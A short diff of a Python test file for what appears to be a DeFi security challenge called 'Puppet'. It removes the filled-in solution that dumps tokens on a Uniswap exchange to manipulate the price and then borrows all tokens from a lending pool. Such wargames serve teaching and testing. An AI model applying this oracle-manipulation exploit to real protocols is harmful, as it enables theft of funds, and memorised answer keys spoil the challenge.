@@ -141,13 +141,6 @@ def test_puppet():
     inital_attacker_eth_balance = attacker.balance()
 
     # YOUR EXPLOIT GOES HERE
-    token.approve(
-        uniswap_exchange.address, ATTACKER_INITAL_TOKEN_BALANCE, {"from": attacker}
-    )
-    uniswap_exchange.tokenToEthSwapInput(
-        ATTACKER_INITAL_TOKEN_BALANCE, 1, DEADLINE, {"from": attacker}
-    )
-    lending_pool.borrow(token.balanceOf(lending_pool.address), {"from": attacker})
 
     # SUCCESS CONDITIONS
     # Attacker has stolen all tokens from the pool
